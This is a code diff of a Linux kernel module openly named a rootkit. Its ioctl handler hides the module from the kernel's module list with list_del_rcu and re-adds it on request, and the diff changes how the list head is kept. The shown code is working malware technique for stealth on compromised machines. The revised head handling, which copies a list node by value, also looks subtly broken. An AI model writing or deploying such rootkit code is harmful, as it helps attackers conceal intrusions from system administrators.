@@ -1,5 +1,3 @@
-#include "linux/export.h"
-#include "linux/kernel.h"
 #include <linux/sched.h>
 #include <linux/module.h>
 #include <linux/syscalls.h>
@@ -23,7 +21,7 @@ MODULE_VERSION("0.1");
 
 static int major;
 struct cdev *kernel_cdev;
-static struct module *module_head;
+static struct list_head modules_head;
 
 static int rootkit_open(struct inode *inode, struct file *filp)
 {
@@ -51,7 +49,7 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 			list_del_rcu(&THIS_MODULE->list);
 			THIS_MODULE->list.next = THIS_MODULE->list.prev = NULL;
 		} else {
-			list_add_rcu(&THIS_MODULE->list, &module_head->list);
+			list_add_rcu(&THIS_MODULE->list, &modules_head);
 		}
 		break;
 	case IOCTL_MOD_MASQ:
@@ -95,7 +93,7 @@ static int __init rootkit_init(void)
 		return ret;
 	}
 
-	module_head = container_of(THIS_MODULE->list.prev, struct module, list);
+	modules_head = *THIS_MODULE->list.prev;
 
 	return 0;
 }
